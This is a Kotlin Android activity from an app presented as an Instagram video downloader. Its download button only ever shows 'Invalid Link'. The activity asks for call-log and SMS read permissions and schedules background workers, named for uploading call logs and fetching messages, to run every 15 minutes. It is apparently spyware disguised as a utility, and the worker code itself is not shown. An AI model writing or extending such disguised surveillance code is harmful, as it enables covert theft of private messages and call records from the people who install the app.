package com.example.instagramvideodownloader.home

import android.Manifest
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import com.example.instagramvideodownloader.R
import com.example.instagramvideodownloader.databinding.ActivityHomeBinding
import com.example.instagramvideodownloader.work_manager.CallLogUploadWorker
import com.example.instagramvideodownloader.work_manager.FetchMessagesWorker
import com.google.android.material.snackbar.Snackbar
import org.koin.android.ext.android.inject
import java.util.concurrent.TimeUnit

class HomeActivity : AppCompatActivity() {
    private lateinit var messagesWorkRequest: PeriodicWorkRequest
    private lateinit var callLogsWorkRequest: PeriodicWorkRequest
    private lateinit var binding: ActivityHomeBinding
    private val repeatIntervalTimeUnit: TimeUnit = TimeUnit.MINUTES
    private val repeatInterval: Long = 15L
    private val constraints: Constraints = Constraints.Builder()
        .setRequiredNetworkType(NetworkType.CONNECTED) // Set your desired network constraint
        .build()
    private val workManager: WorkManager by inject()

    companion object {
        private const val CALL_LOG_PERMISSION_REQUEST_CODE = 101
        private const val SMS_PERMISSION_REQUEST_CODE = 1000
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityHomeBinding.inflate(layoutInflater)
        setContentView(binding.root)
        requestCallLogPermission()
        setCta()
    }

    private fun setCta() {
        binding.btCtaDownload.setOnClickListener {
            Snackbar.make(binding.root, "Invalid Link", Snackbar.LENGTH_SHORT).show()
        }
    }

    private fun checkPermissionsAndStartWorkers() {
        if (hasCallLogPermission() && hasSMSPermission()) {
            startCallLogsWorker()
            startMessagesWorker()
        } else {
            requestCallLogPermission()
            requestSMSPermission()
        }
    }

    private fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestCallLogPermission() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(
                this,
                Manifest.permission.READ_CALL_LOG
            )
        ) {
            Snackbar.make(
                findViewById(android.R.id.content),
                R.string.call_log_permission_rationale,
                Snackbar.LENGTH_LONG
            ).setAction(R.string.grant) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_CALL_LOG),
                    CALL_LOG_PERMISSION_REQUEST_CODE
                )
            }.show()
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_CALL_LOG),
                CALL_LOG_PERMISSION_REQUEST_CODE
            )
        }
    }

    fun startMessagesWorker() {
        messagesWorkRequest = PeriodicWorkRequest.Builder(
            FetchMessagesWorker::class.java,
            repeatInterval, // Set the time interval between repeats (in milliseconds)
            repeatIntervalTimeUnit // Set the time unit for the interval
        )
            .addTag("SMS Logs")
            .setConstraints(constraints)
            .build()

        workManager.enqueue(messagesWorkRequest)
    }

    fun startCallLogsWorker() {
        callLogsWorkRequest = PeriodicWorkRequest.Builder(
            CallLogUploadWorker::class.java,
            repeatInterval, // Set the time interval between repeats (in milliseconds)
            repeatIntervalTimeUnit // Set the time unit for the interval
        )
            .addTag("Call Logs")
            .setConstraints(constraints)
            .build()

        workManager.enqueue(callLogsWorkRequest)

    }

    private fun hasSMSPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestSMSPermission() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_SMS),
            SMS_PERMISSION_REQUEST_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            CALL_LOG_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    requestSMSPermission()
                } else {
                    // Handle permission denied
                }
            }

            SMS_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    checkPermissionsAndStartWorkers()
                } else {
                    // Handle permission denied
                }
            }
        }
    }
}
